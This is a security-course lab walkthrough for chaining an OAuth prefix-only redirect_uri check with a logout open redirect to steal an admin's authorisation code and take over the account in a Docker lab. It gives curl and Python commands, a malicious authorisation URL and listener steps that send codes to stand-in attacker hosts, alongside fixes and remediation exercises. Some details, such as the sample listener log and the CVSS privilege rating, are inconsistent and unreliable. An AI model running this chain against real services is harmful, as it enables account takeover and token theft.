---
title: "OAuth Attack Lab — Steal OAuth Token via Open Redirect Chain"
tags: [OAuth, open-redirect, token-theft, authorization-code, lab, Docker, Node.js,
       redirect-uri, PKCE, state-bypass, ATT&CK-T1550, CWE-601, account-takeover]
module: 04-BroadSurface-01
day: 172
related_topics:
  - OAuth Abuse Deep Dive (Day 171)
  - Open Redirect (Day 133)
  - SAML Attacks (Day 173)
  - Account Takeover Chains (Day 174)
---

# Day 172 — OAuth Attack Lab

> "The open redirect is on the logout page. The redirect_uri check is a
> startsWith. Put them together and you own any account on the platform.
> That is the chain. Find the components. Connect them."
>
> — Ghost

---

## Goals

By the end of this lab you will be able to:

1. Enumerate the OAuth flow endpoints and identify the redirect_uri
   validation logic.
2. Discover an open redirect on the client application.
3. Chain the open redirect into a redirect_uri bypass to steal the
   authorisation code.
4. Exchange the stolen code for a valid access token.
5. Achieve account takeover on a test account.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| OAuth deep dive | Day 171 |
| Open redirect theory | Day 133 |
| Burp Suite proxy | Days 22–24 |
| Python requests | Days 149, 152 |
| Docker Compose | Days 150–151 |

---

## Lab Setup

```bash
cd learn-security/04-BroadSurface-01/samples/oauth-lab/
docker compose up --build -d

# Services:
# AS (Authorization Server): http://localhost:9000
# Client App:                http://localhost:9001
docker compose ps
```

### Lab Architecture Overview

```
┌──────────────────────────────────────────┐
│  Authorization Server (localhost:9000)   │
│  - /oauth/authorize                      │
│  - /oauth/token                          │
│  - /.well-known/oauth-authorization-server│
│  Registered redirect_uris:               │
│  - http://localhost:9001/callback        │
│  redirect_uri check: startsWith()         │
└──────────────────────────────────────────┘
            ↕ OAuth flow
┌──────────────────────────────────────────┐
│  Client Application (localhost:9001)     │
│  - /                     Home            │
│  - /login                Initiates OAuth │
│  - /callback             Handles code    │
│  - /logout?next=         OPEN REDIRECT   │
│  - /profile              Protected page  │
│  - /admin                Admin only      │
└──────────────────────────────────────────┘
```

### Docker Compose

```yaml
# docker-compose.yml
version: "3.9"
services:
  auth-server:
    build: ./auth-server
    ports: ["9000:9000"]
    networks: [oauth-lab]

  client-app:
    build: ./client-app
    ports: ["9001:9001"]
    environment:
      AUTH_SERVER: http://auth-server:9000
      CLIENT_ID: lab-client
      CLIENT_SECRET: lab-client-secret
      REDIRECT_URI: http://localhost:9001/callback
    depends_on: [auth-server]
    networks: [oauth-lab]

networks:
  oauth-lab:
```

### User Accounts

| Account | Role | Credentials |
|---|---|---|
| alice | admin | alice@lab.local / alice123 |
| bob | user | bob@lab.local / bob456 |

You are the attacker. You have a valid account (`bob`). Your target is to
steal alice's access token and access the `/admin` endpoint.

---

## Objective 1 — Enumerate the OAuth Flow

### Step 1.1 — Discover the authorisation server metadata

```bash
curl -s http://localhost:9000/.well-known/oauth-authorization-server | jq .
```

Expected response:
```json
{
  "issuer": "http://localhost:9000",
  "authorization_endpoint": "http://localhost:9000/oauth/authorize",
  "token_endpoint": "http://localhost:9000/oauth/token",
  "scopes_supported": ["openid", "profile", "email"],
  "response_types_supported": ["code", "token"],
  "grant_types_supported": ["authorization_code", "implicit"]
}
```

**Note:** `"token"` in `response_types_supported` → implicit flow is enabled.

### Step 1.2 — Initiate a legitimate OAuth flow

With Burp running, click "Login" in the client application. Observe the
authorisation URL:

```
http://localhost:9000/oauth/authorize
  ?response_type=code
  &client_id=lab-client
  &redirect_uri=http://localhost:9001/callback
  &scope=openid profile email
  &state=<random-value>
```

**What to check:**
- Is `state` present? Yes → CSRF protected (for now)
- Is `code_challenge` present? No → No PKCE

### Step 1.3 — Identify redirect_uri validation

Test a modified redirect_uri:

```bash
# Test: does the AS validate the full URI or just the prefix?
curl -sv "http://localhost:9000/oauth/authorize?\
response_type=code\
&client_id=lab-client\
&redirect_uri=http://localhost:9001/callback/extra\
&scope=openid\
&state=test" 2>&1 | grep -E 'Location:|error'
# → Location: http://localhost:9001/callback/extra?code=... ← ALLOWS extra path!
```

The AS validates only that `redirect_uri` starts with
`http://localhost:9001/callback` — path components after `/callback` are
accepted. This is a prefix-only check.

---

## Objective 2 — Find the Open Redirect

```bash
# Test the logout endpoint
curl -sv "http://localhost:9001/logout?next=http://evil.com" 2>&1 \
  | grep "Location:"
# → Location: http://evil.com
```

The `/logout?next=` endpoint redirects to any URL — no validation. Combined
with the AS's prefix-only redirect_uri check:

```
Registered:  http://localhost:9001/callback
Accepted:    http://localhost:9001/callback/../logout?next=ATTACKER_URL
```

Wait — does `/../logout` resolve within the path? Let us test:

```bash
curl -sv "http://localhost:9000/oauth/authorize?\
response_type=code\
&client_id=lab-client\
&redirect_uri=http://localhost:9001/callback/../logout?next=http://attacker.com\
&scope=openid\
&state=test" 2>&1 | grep "Location:"
# → Location: http://localhost:9001/callback/../logout?next=http://attacker.com&code=...
```

The AS issued the code redirect. Now the client application resolves
`/callback/../logout` → `/logout?next=http://attacker.com&code=AUTHCODE`.
The `/logout` endpoint redirects to `http://attacker.com` — the code is in
the Referer header.

---

## Objective 3 — Execute the Attack Chain

### Step 3.1 — Set up a listener to catch the redirect

```bash
# Start a simple HTTP server to receive the redirect
python3 -m http.server 8888 &
ATTACKER_IP="127.0.0.1"   # Replace with your LAN IP if testing across machines
```

### Step 3.2 — Craft the malicious authorisation URL

```python
import urllib.parse

attacker_listener = f"http://{ATTACKER_IP}:8888/steal"

# The redirect_uri uses path traversal to reach the logout open redirect
malicious_redirect = (
    "http://localhost:9001/callback/../logout"
    + "?next=" + urllib.parse.quote(attacker_listener, safe="")
)

oauth_url = (
    "http://localhost:9000/oauth/authorize"
    "?response_type=code"
    "&client_id=lab-client"
    f"&redirect_uri={urllib.parse.quote(malicious_redirect, safe='')}"
    "&scope=openid profile email"
    "&state=attacker_state"
)

print(f"[*] Send to victim (alice):\n{oauth_url}")
```

### Step 3.3 — Simulate victim clicking the link

In a real engagement, you would send this URL to the target user (phishing,
shared link, stored XSS, etc.). In the lab, you can directly visit it as
alice using a separate browser session:

```bash
# In Firefox: log in as alice at http://localhost:9001
# Then visit the malicious URL above
# Alice's browser:
# 1. Goes to AS /oauth/authorize (already authenticated as alice)
# 2. AS issues code and redirects to malicious redirect_uri
# 3. Client app /logout redirects to your listener
# 4. Auth code is now in your listener's request log
```

### Step 3.4 — Extract the auth code from server logs

Your Python HTTP server will receive:

```
127.0.0.1 - - [GET] /steal?next=http://attacker.com
Referer: http://localhost:9001/logout?next=http://127.0.0.1:8888/steal&code=AUTH_CODE_HERE&state=...
```

Extract the `code` parameter from the referer:

```bash
# Or capture it directly in the URL if the logout endpoint includes
# the code in its redirect target (check the implementation)
curl -sv "http://127.0.0.1:8888/steal?code=AUTH_CODE" 2>&1
```

### Step 3.5 — Exchange the code for alice's access token

```bash
AUTH_CODE="AUTH_CODE_FROM_STEP_3.4"

curl -s -X POST http://localhost:9000/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=${AUTH_CODE}" \
  -d "redirect_uri=http://localhost:9001/callback/../logout?next=http://127.0.0.1:8888/steal" \
  -d "client_id=lab-client" \
  -d "client_secret=lab-client-secret" | jq .
```

Expected response:
```json
{
  "access_token": "ALICE_ACCESS_TOKEN",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "openid profile email"
}
```

### Step 3.6 — Access the admin panel as alice

```bash
ALICE_TOKEN="ACCESS_TOKEN_FROM_STEP_3.5"

curl -s http://localhost:9001/admin \
  -H "Authorization: Bearer ${ALICE_TOKEN}" | jq .
# → {"message": "Welcome, alice@lab.local (admin)", "flag": "FLAG{oauth_open_redirect_chain}"}
```

---

## Objective 4 — Document the Vulnerability Chain

### Full Attack Chain

```
Component 1 — AS redirect_uri prefix-only check:
  Registered: http://localhost:9001/callback
  Accepted:   http://localhost:9001/callback/[ANYTHING]
  Impact:     Any URL starting with the prefix is accepted

Component 2 — Client open redirect at /logout?next=:
  GET /logout?next=http://evil.com → 302 Location: http://evil.com
  No validation on the next parameter

Chain:
  redirect_uri = http://localhost:9001/callback/../logout?next=ATTACKER
  AS accepts (prefix match) → redirects with code appended
  Client resolves ../logout → /logout → redirects to ATTACKER
  Attacker receives code in Referer header
  Attacker exchanges code for token → full account access
```

### CVSS Score

```
AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
Base Score: 8.7 (High)

Justification:
  AV:N — exploitable over network
  AC:L — no special conditions; reliable chain
  PR:N — attacker has no account; victim must be logged in (hence UI:R)
  UI:R — victim must click the malicious link
  S:C  — attacker accesses victim's account on the auth server (scope change)
  C:H  — full access to victim's profile, tokens, data
  I:H  — full control of victim's account actions
```

---

## Key Takeaways

1. **prefix-only redirect_uri validation is common and dangerous.** It allows
   any path under the registered prefix — including redirects to open redirects.
2. **Open redirect + OAuth = critical severity.** Any open redirect on a domain
   that is registered as an OAuth redirect_uri is automatically a critical
   vulnerability. Always check for open redirects as soon as you identify
   OAuth scope.
3. **The state parameter does not protect against this attack.** The state
   prevents CSRF (victim initiating a flow the attacker controls). Here, the
   attacker initiates a legitimate flow that the victim completes — state
   is intact, the vulnerability is in the redirect_uri.
4. **The fix requires two changes:** (1) exact redirect_uri matching, not
   prefix; (2) validate the `next` parameter on the logout endpoint against
   an allowlist of safe paths.
5. **Real-world impact:** the victim does not notice. They authenticated
   normally. The code was stolen silently from the Referer header. Account
   takeover with no visible error.

---

## Exercises

1. Modify the attack to steal alice's token via the implicit flow instead of
   the authorisation code flow. What changes in the URL? Where does the token
   appear in the redirect?
2. Fix the AS redirect_uri validation to use exact matching instead of
   startsWith. Verify the attack chain no longer works.
3. Fix the client application's `/logout` endpoint to only allow `next` values
   from a hardcoded allowlist (`/`, `/dashboard`, `/profile`). Verify the open
   redirect no longer works.
4. Write a complete CVSS-scored finding report for the vulnerability chain
   including both components as a single finding. Use the Day 161 template.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q172.1, Q172.2 …).
> Follow-up questions use hierarchical numbering (Q172.1.1, Q172.1.2 …).

---

## Navigation

← Previous: [Day 171 — OAuth Abuse Deep Dive](DAY-0171-OAuth-Abuse-Deep-Dive.md)
→ Next: [Day 173 — SAML Attacks](DAY-0173-SAML-Attacks.md)
